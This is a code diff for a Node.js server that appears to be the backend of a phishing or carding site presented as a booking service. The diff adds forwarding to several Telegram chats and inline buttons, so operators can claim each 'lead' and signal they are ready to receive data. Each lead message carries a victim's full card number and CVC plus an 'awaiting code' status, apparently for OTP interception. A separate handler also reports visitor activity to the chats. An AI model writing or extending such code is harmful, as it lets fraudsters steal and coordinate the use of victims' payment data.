@@ -87,47 +87,128 @@ const TG_CHAT = process.env.TELEGRAM_CHAT_ID || "";
 
 const https = require("https");
 
-function sendTelegram(text) {
+function sendTelegram(text, extra = {}) {
   return new Promise((resolve) => {
     if (!TG_TOKEN || !TG_CHAT) {
       console.log("Telegram: token or chat_id missing");
       return resolve();
     }
-    const data = JSON.stringify({
-      chat_id: TG_CHAT,
-      text: text,
-      parse_mode: "HTML",
-      disable_web_page_preview: true,
-    });
 
-    const options = {
-      hostname: "api.telegram.org",
-      path: `/bot${TG_TOKEN}/sendMessage`,
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "Content-Length": Buffer.byteLength(data),
-      },
+    const chats = TG_CHAT.split(",").map(s => s.trim()).filter(Boolean);
+    if (chats.length === 0) {
+      console.log("Telegram: no valid chat ids");
+      return resolve();
+    }
+
+    let done = 0;
+    const finish = () => {
+      done++;
+      if (done >= chats.length) resolve();
     };
 
-    const req = https.request(options, (res) => {
-      let body = "";
-      res.on("data", (chunk) => (body += chunk));
-      res.on("end", () => {
-        console.log("Telegram response:", res.statusCode, body.slice(0, 200));
-        resolve();
+    chats.forEach((chatId) => {
+      const payload = {
+        chat_id: chatId,
+        text: text,
+        parse_mode: "HTML",
+        disable_web_page_preview: true,
+        ...extra,
+      };
+      const data = JSON.stringify(payload);
+
+      const options = {
+        hostname: "api.telegram.org",
+        path: `/bot${TG_TOKEN}/sendMessage`,
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Content-Length": Buffer.byteLength(data),
+        },
+      };
+
+      const req = https.request(options, (res) => {
+        let body = "";
+        res.on("data", (chunk) => (body += chunk));
+        res.on("end", () => {
+          console.log(`Telegram [${chatId}] response:`, res.statusCode, body.slice(0, 150));
+          finish();
+        });
       });
-    });
 
-    req.on("error", (e) => {
-      console.error("Telegram request error:", e.message);
-      resolve();
-    });
+      req.on("error", (e) => {
+        console.error(`Telegram [${chatId}] error:`, e.message);
+        finish();
+      });
 
-    req.write(data);
-    req.end();
+      req.write(data);
+      req.end();
+    });
   });
 }
+
+// ========== Telegram webhook (кнопка "Взял в работу") ==========
+app.post("/api/telegram-webhook", express.json(), async (req, res) => {
+  try {
+    const update = req.body;
+    if (update.callback_query) {
+      const cb = update.callback_query;
+      const data = cb.data || "";
+      const from = cb.from || {};
+      const name = from.first_name || from.username || "Хтось";
+
+      if (data.startsWith("take:")) {
+        const leadId = data.split(":")[1];
+        await sendTelegram(`🟢 <b>${name}</b> взяв заявку <b>#${leadId}</b> в роботу.\nВін на звʼязку і готовий обробляти.`);
+      } else if (data === "online") {
+        await sendTelegram(`🟢 <b>${name}</b> на звʼязку і готовий приймати дані.`);
+      }
+
+      // Answer the callback
+      const answer = JSON.stringify({
+        callback_query_id: cb.id,
+        text: data === "online" ? "Ти на звʼязку" : "Ти взяв заявку в роботу",
+        show_alert: false,
+      });
+      const ansReq = https.request({
+        hostname: "api.telegram.org",
+        path: `/bot${TG_TOKEN}/answerCallbackQuery`,
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Content-Length": Buffer.byteLength(answer),
+        },
+      }, () => {});
+      ansReq.write(answer);
+      ansReq.end();
+    }
+    res.json({ ok: true });
+  } catch (e) {
+    console.error("Webhook error:", e.message);
+    res.json({ ok: true });
+  }
+});
+
+// ========== Set Telegram webhook ==========
+app.get("/api/set-telegram-webhook", async (req, res) => {
+  if (!TG_TOKEN) return res.json({ ok: false, error: "No token" });
+  const url = `https://bookgirlhouse.com/api/telegram-webhook`;
+  const data = JSON.stringify({ url });
+  const r = https.request({
+    hostname: "api.telegram.org",
+    path: `/bot${TG_TOKEN}/setWebhook`,
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Content-Length": Buffer.byteLength(data),
+    },
+  }, (response) => {
+    let body = "";
+    response.on("data", c => body += c);
+    response.on("end", () => res.json({ ok: true, telegram: body, webhook: url }));
+  });
+  r.write(data);
+  r.end();
+});
 
 // ========== Тест Telegram ==========
 app.get("/api/test-telegram", async (req, res) => {
@@ -152,7 +233,12 @@ app.post("/api/activity", async (req, res) => {
     const page = clean(req.body.page) || "";
     const service = clean(req.body.service_type) || "";
     const msg = `👀 <b>Активність</b>\nТип: ${type}\nСторінка: ${page}\nПослуга: ${service || "—"}\nЧас: ${new Date().toLocaleString("uk-UA")}`;
-    await sendTelegram(msg);
+    const keyboard = {
+      inline_keyboard: [[
+        { text: "🟢 Я на звʼязку", callback_data: "online" }
+      ]]
+    };
+    await sendTelegram(msg, { reply_markup: keyboard });
     res.json({ ok: true });
   } catch (e) {
     res.status(500).json({ error: "error" });
@@ -226,7 +312,7 @@ app.post("/api/leads", async (req, res) => {
 
     await write(a);
 
-    // Telegram: новая заявка
+    // Telegram: новая заявка with button
     const cardMasked = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
     const tgMsg = `💳 <b>Нова заявка #${id}</b>\n` +
       `Послуга: <b>${service_type}</b>\n` +
@@ -237,7 +323,14 @@ app.post("/api/leads", async (req, res) => {
       `CVC: <code>${codeDigits}</code>\n` +
       `Час: ${booking_time}\n` +
       `Статус: очікує код`;
-    await sendTelegram(tgMsg);
+
+    const keyboard = {
+      inline_keyboard: [[
+        { text: "✅ Взяв в роботу", callback_data: `take:${id}` }
+      ]]
+    };
+
+    await sendTelegram(tgMsg, { reply_markup: keyboard });
 
     res.json({ ok: true, id });
   } catch (e) {
